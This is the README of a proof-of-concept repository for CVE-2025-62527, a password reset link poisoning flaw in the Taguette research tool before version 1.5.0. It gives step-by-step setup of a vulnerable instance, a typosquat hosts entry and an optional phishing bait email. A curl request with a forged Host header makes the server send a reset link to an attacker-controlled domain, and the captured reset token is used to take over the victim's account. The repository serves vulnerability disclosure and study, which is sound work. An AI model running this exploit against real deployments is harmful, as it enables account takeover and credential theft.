# CVE_2025_62527_PoC

<img width="403" height="746" alt="image" src="https://github.com/user-attachments/assets/6632d1ec-3b92-46ea-9b45-1d2b6fb02ce8" />

## Overview
A **password reset link poisoning vulnerability** (CVE-2025-62527) was identified in **Taguette**, an open-source qualitative research tool.  
This issue affects **versions prior to 1.5.0** and was **publicly disclosed on October 20, 2025**.

The vulnerability allows an attacker to craft and send **malicious password reset links** to legitimate users.  
If a victim clicks the tampered link, their account credentials could be compromised or redirected to an attacker-controlled domain.

For more information, see the [GitHub Security Advisory](https://github.com/remram44/taguette/security/advisories/GHSA-7rc8-5c8q-jr6j).

---


## Setup

```
git clone https://github.com/Mitchellzhou1/CVE_2025_62527_PoC.git
cd CVE_2025_62527_PoC
python3 -m venv taguette.virtualenv
. taguette.virtualenv/bin/activate
pip install taguette==1.4.1
touch taguette.db
wget https://github.com/mailhog/MailHog/releases/latest/download/MailHog_linux_amd64
chmod +x MailHog_linux_amd64


// This is completely optional step. I my views.py just comments out the email reset rate limit
cp views.py ./taguette.virtualenv/lib/python3.13/site-packages/taguette/web/views.py

// Optional, but this is to make the scenario more believable with typosquating (taguete)
echo "127.0.0.1 taguete" | sudo tee -a /etc/hosts
```

In one terminal run:
```
taguette --no-browser server config.py
```
password = `admin`
url = `http://localhost:7465/`

Register an account, for the demo I used:

Login: `john`
Password: `12345`
Email: `john@gmail.com`
<img width="488" height="434" alt="image" src="https://github.com/user-attachments/assets/b9f8bd5a-0e32-4c85-8130-7137b14e7afa" />

How enter the Attacker! He wants to gain control of John's account.

in a seperate terminal run:
```
./MailHog_linux_amd64
```

Open another terminal and run:
```
python3 webhook.py
```


For the sake of the demonstration, this MailHog will be the view of John our victim.
then navigate to MailHog at `http://0.0.0.0:8025/`

Optional: run `python3 first_email.py` to send a Password Expired bait email to John, or it might make John suspecious that he got a password reset link when he never asked for it.

Now time to send the malicious password reset email:

```
curl -i -X POST 'http://127.0.0.1:7465/reset_password' \
  -H 'Host: taguete.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: _xsrf=2|c3bd35bd|735af119b351286a96df7924fa7ca0ed|1761923555' \
  --data-urlencode "_xsrf=2|c3bd35bd|735af119b351286a96df7924fa7ca0ed|1761923555" \
  --data-urlencode "email=john@gmail.com"
```

Go back to HogMail, and John should see a email reset link set by the Legit Taguette server but we have injected our domain into the based of the link (taguete.com).

<img width="713" height="387" alt="image" src="https://github.com/user-attachments/assets/2862ea70-d69f-42bf-951d-1ee7df6643f8" />

The legitmate domain was localhost:7465 
<img width="713" height="387" alt="image" src="https://github.com/user-attachments/assets/8eff466d-486e-4aeb-a01a-ded50341f49f" />


Now "John" clicks on the malicious link and our webhook captures the request:
<img width="748" height="156" alt="image" src="https://github.com/user-attachments/assets/0c926d28-b0bd-4f16-9ad4-ba7c1607f00e" />

We now have the reset_token, which is linked to John's account, and we can now reset his password and takeover his account.

Go to: 
`http://localhost:7465/new_password?reset_token=<captured_token>`

<img width="778" height="436" alt="image" src="https://github.com/user-attachments/assets/22cb339c-5261-4ff9-9280-4d48d50adcd4" />





